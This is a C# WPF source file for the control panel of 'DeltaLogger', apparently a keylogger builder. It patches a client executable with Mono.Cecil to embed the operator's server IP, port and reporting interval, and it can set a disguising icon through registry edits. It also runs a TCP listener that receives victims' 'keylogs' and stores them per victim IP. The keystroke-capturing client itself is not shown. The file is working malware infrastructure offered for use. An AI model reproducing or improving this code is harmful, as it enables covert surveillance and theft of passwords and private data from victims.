using System;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq.Expressions;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
using Mono.Cecil;
using Mono.Cecil.Cil;
using System.Text.Json;
using System.Windows.Controls;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Confuser.Core;
using Confuser.Core.Project;
using Confuser.Renamer;
using Confuser.Renamer.Analyzers;
using DeltaLogger.Networking;
using System.Xml.Linq;

namespace DeltaLogger
{
    public partial class MainWindow : Window
    {
        private readonly ObservableCollection<string> _logFiles;
        private TCPServer? _tcpServer;

        public MainWindow()
        {
            InitializeComponent();
            _logFiles = [];
            LogListBox.ItemsSource = _logFiles;
            IpTextBox.Text = GetLocalIPAddress();
            ServerIpTextBox.Text = GetLocalIPAddress();
            LoadLogs();
        }

        private void MinimizeWindow_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("Minimize Clicked");
            WindowState = WindowState.Minimized;
        }

        private void MaximizeWindow_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
        }

        private void CloseWindow_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ButtonState == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private async void BuildButton_Click(object sender, RoutedEventArgs e)
        {
            if (IpTextBox.Text.Trim().Length == 0)
            {
                MessageBox.Show("Please enter the IP address", "Missing Field", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (PortTextBox.Text.Trim().Length == 0)
            {
                MessageBox.Show("Please enter the Port", "Missing Field", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (IntervalTextBox.Text.Trim().Length == 0)
            {
                MessageBox.Show("Please enter the interval", "Missing Field", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (InputFileTextBox.Text.Trim().Length == 0)
            {
                MessageBox.Show("Please enter the input filename", "Missing Field", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (OutputFileTextBox.Text.Trim().Length == 0)
            {
                MessageBox.Show("Please enter the output filename", "Missing Field", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            string ipAddress = IpTextBox.Text;
            string portText = PortTextBox.Text;
            string intervalText = IntervalTextBox.Text;
            string outputAssemblyPath = OutputFileTextBox.Text;
            string inputAssemblyPath = InputFileTextBox.Text;

            if (!int.TryParse(portText, out int port) || !int.TryParse(intervalText, out int interval))
            {
                MessageBox.Show("Please enter valid numeric values for Port and Interval.", "Invalid Input", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            var progress = new Progress<string>(message => LogMessage(message, BuildOutputTextArea));

            try
            {
                BuildButton.IsEnabled = false;
                await ModifyAssemblyAsync(inputAssemblyPath, outputAssemblyPath, ipAddress, port, interval, progress);
                MessageBox.Show("Client executable has been modified successfully.", "Build Complete", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                LogMessage("Error in attempting to modify assembly: " + ex.Message, BuildOutputTextArea);
                MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            BuildButton.IsEnabled = true;
        }

        private Task ModifyAssemblyAsync(string assemblyPath, string outputAssemblyPath, string ip, int port, int interval, IProgress<string> progress)
        {
            return Task.Run(() =>
            {
                ModifyAssembly(assemblyPath, outputAssemblyPath, ip, port, interval, message => progress.Report(message));
            });
        }

        private void LogMessage(string message, TextBox textBox)
        {
            Dispatcher.Invoke(() =>
            {
                textBox.AppendText($"{DateTime.Now}: {message}{Environment.NewLine}");
                textBox.ScrollToEnd();
            });

        }

        private void SetFields(AssemblyDefinition assembly, MethodDefinition ctor, string assemblyPath, string outputAssemblyPath, string ip, int port, int interval, Action<string> logMessage)
        {
            foreach (var instruction in ctor.Body.Instructions)
            {
                if (instruction.OpCode != OpCodes.Stsfld || instruction.Operand is not FieldReference field)
                {
                    continue;
                }
                logMessage("Checking assembly field: " + field.Name);
                if (field.Name == "_serverIp")
                {
                    logMessage("Setting Server IP in assembly");
                    instruction.Previous.OpCode = OpCodes.Ldstr;
                    instruction.Previous.Operand = ip;
                }
                else if (field.Name == "_serverPort")
                {
                    logMessage("Setting Port in assembly");
                    instruction.Previous.OpCode = OpCodes.Ldc_I4;
                    instruction.Previous.Operand = port;
                }
                else if (field.Name == "_interval")
                {
                    logMessage("Setting Interval in assembly");
                    instruction.Previous.OpCode = OpCodes.Ldc_I4;
                    instruction.Previous.Operand = interval;
                }
            }           
        }

        private void ModifyAssembly(string inputAssemblyPath, string outputAssemblyPath, string ip, int port, int interval, Action<string> logMessage)
        {
            AssemblyDefinition assembly = AssemblyDefinition.ReadAssembly(inputAssemblyPath);
            logMessage($"Assembly {inputAssemblyPath} succesfully loaded");

            TypeDefinition type = assembly.MainModule.GetType("Delta.Program");
            MethodDefinition ctor = type.Methods.First(m => m.IsConstructor && m.IsStatic);
            ILProcessor ilProcessor = ctor.Body.GetILProcessor();

            SetFields(assembly, ctor, inputAssemblyPath, outputAssemblyPath, ip, port, interval, logMessage);
            assembly.Write(outputAssemblyPath); 
            logMessage("Assembly written to " + outputAssemblyPath);
            SetFileIcon(logMessage);
        }

        private void SetFileIcon(Action<string> logMessage)
        {
            string? iconPath = null;

            Dispatcher.Invoke(() =>
            {
                if (IconPathLabel.Content != null)
                {
                    iconPath = IconPathLabel.Content.ToString();
                }
            });

            if (string.IsNullOrEmpty(iconPath) || !File.Exists(iconPath))
            {
                return;
            }
            string extension = Path.GetExtension(iconPath);
            logMessage($"Setting image files to {iconPath}");

            try
            {
                string fileType = $"Delta_{extension.TrimStart('.')}_File";
                string extKey = $@"Software\Classes\{extension}";
                string iconKey = $@"Software\Classes\{fileType}\DefaultIcon";

                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(extKey))
                {
                    key.SetValue("", fileType);
                }

                // Set the default icon for the file type
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(iconKey))
                {
                    key.SetValue("", iconPath);
                }

                RefreshIconCache();

                logMessage($"Icon set to {iconPath}");
            }
            catch (Exception ex)
            {
                logMessage($"Error changing icon: {ex.Message}");
            }
        }

        [DllImport("shell32.dll")]
        private static extern int SHChangeNotify(int wEventId, int uFlags, IntPtr dwItem1, IntPtr dwItem2);

        private static void RefreshIconCache()
        {
            // Notify the system to refresh the icon cache
            SHChangeNotify(0x08000000, 0x0000, IntPtr.Zero, IntPtr.Zero);
        }

        private void StartServer(string ipAddress, int port)
        {
            LogMessage($"Attempting to start server on {ipAddress} and port {port}", ServerLogTextArea);
            try
            {
                LogMessage("Initializing TCP Server", ServerLogTextArea);
                _tcpServer = new(ipAddress, port, OnTcpClientUpdate);
                LogMessage("Starting TCP Listener", ServerLogTextArea);
                _tcpServer.Start();
                UpdateUIForServerRunning();
                LogMessage("Server connected, waiting for keylogs...", ServerLogTextArea);
            }
            catch (Exception ex)
            {
                LogMessage("An error occured when attempting to start the server: " + ex.Message, ServerLogTextArea);
                MessageBox.Show($"Failed to start server: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void StopServer()
        {
            try
            {
                LogMessage("Stopping TCP Listener", ServerLogTextArea);
                _tcpServer?.Stop();
                UpdateUIForServerStopped();
            }
            catch (Exception ex)
            {
                LogMessage("An error occured when attempting to stop the server: " + ex.Message, ServerLogTextArea);
                MessageBox.Show($"Failed to stop server: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void UpdateUIForServerRunning()
        {
            ServerStatusLabel.Content = "Running";
            ServerStatusLabel.Foreground = new SolidColorBrush(System.Windows.Media.Colors.Green);
            StartServerButton.Content = "Stop Server";
        }

        private void UpdateUIForServerStopped()
        {
            ServerStatusLabel.Content = "Disconnected";
            ServerStatusLabel.Foreground = new SolidColorBrush(System.Windows.Media.Colors.Yellow);
            StartServerButton.Content = "Start Server";
        }
 
        private void OnTcpClientUpdate(string receivedData)
        {
            if (_tcpServer == null)
            {
                LogMessage("TcpServer is not connected", ServerLogTextArea);
                return;
            }
            string clientIp = _tcpServer.IPAddress.ToString();
            string logFilePath = $"logs/{clientIp}.log";
            LogMessage($"Received data: {receivedData}", ServerLogTextArea);
            LogMessage($"Writing data to {logFilePath}", ServerLogTextArea);
            File.AppendAllText(logFilePath, receivedData);

            Dispatcher.Invoke(() =>
            {
                if (!_logFiles.Contains(logFilePath))
                {
                    AddLog(logFilePath);
                }
                if (LogListBox.SelectedItem != null && LogListBox.SelectedItem.ToString() == logFilePath)
                {
                    LogTextArea.Text = File.ReadAllText(logFilePath);
                    LogTextArea.ScrollToEnd();
                }

            });
        }

        private void AddLog(string logFilePath)
        {
            string fileName = System.IO.Path.GetFileNameWithoutExtension(logFilePath);

            if (!string.IsNullOrEmpty(fileName))
            {
                if (!_logFiles.Contains(fileName))
                {
                    _logFiles.Add(fileName);
                }
            }
        }

        private void LogListBox_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {
            if (LogListBox.SelectedItem == null)
            {
                return;
            }
            string? selectedFile = LogListBox.SelectedItem?.ToString();            
            if (!string.IsNullOrEmpty(selectedFile))
            {
                selectedFile = $"logs/{selectedFile}.log";
                LogTextArea.Text = File.ReadAllText(selectedFile);
            }            
        }

        private void LoadLogs()
        {
            string[] logFiles = Directory.GetFiles("logs", "*.log");
            foreach (var logFile in logFiles)
            {
                AddLog(logFile);
            }
        }

        private string GetLocalIPAddress()
        {
            string localIP = string.Empty;
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                localIP = host.AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)?.ToString() ?? "127.0.0.1";
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Unable to get the local IP address: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                localIP = "127.0.0.1"; // Fallback to localhost
            }

            return localIP;
        }
        private void NumericOnly_PreviewTextInput(object sender, TextCompositionEventArgs e)
        {
            e.Handled = !IsTextNumeric(e.Text);
        }

        // Event handler for pasting to allow only numeric input
        private void NumericOnly_Pasting(object sender, DataObjectPastingEventArgs e)
        {
            if (e.DataObject.GetDataPresent(typeof(string)))
            {
                string text = (string)e.DataObject.GetData(typeof(string));
                if (!IsTextNumeric(text))
                {
                    e.CancelCommand();
                }
            }
            else
            {
                e.CancelCommand();
            }
        }

        // Helper method to check if the text is numeric
        private static bool IsTextNumeric(string text)
        {
            Regex regex = new("[^0-9]+"); // Regex that matches non-numeric text
            return !regex.IsMatch(text);
        }

        private void StartServerButton_Click(object sender, RoutedEventArgs e)
        {
            if (_tcpServer != null && _tcpServer.IsRunning)
            {
                StopServer();
                return;
            }     

            if (ServerIpTextBox.Text.Trim().Length == 0)
            {
                MessageBox.Show("Missing IP address", "Missing Field", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (ServerPortTextBox.Text.Trim().Length == 0)
            {
                MessageBox.Show("Missing Port", "Missing Field", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (ServerIpTextBox.Text.Trim().Length == 0)
            {
                MessageBox.Show("Please enter a valid IP address.", "Invalid IP Address", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (!int.TryParse(ServerPortTextBox.Text, out int port))
            {
                MessageBox.Show("Please enter a valid port number.", "Invalid Port", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            StartServer(ServerIpTextBox.Text, port);
        }

        private void InputFileButton_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new()
            {
                Title = "Choose input file",
                Filter = "Executable files (*.exe)|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            };

            if (openFileDialog.ShowDialog() == true)
            {
                InputFileTextBox.Text = openFileDialog.FileName;
            }
        }

        private void OutputFileButton_Click(object sender, RoutedEventArgs e)
        {
            SaveFileDialog saveFileDialog = new()
            {
                Title = "Choose output file",
                Filter = "Executable files (*.exe)|*.exe",
                DefaultExt = "exe",
                AddExtension = true,
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            };

            if (saveFileDialog.ShowDialog() == true)
            {
                OutputFileTextBox.Text = saveFileDialog.FileName;
            }
        }

        private void BrowsIconButton_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new()
            {
                Title = "Select an Icon",
                Filter = "Icon files (*.ico)|*.ico",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            };
                            
            if (openFileDialog.ShowDialog() == true)
            {
                IconPathLabel.Content = openFileDialog.FileName;
            }
            
        }
    }
}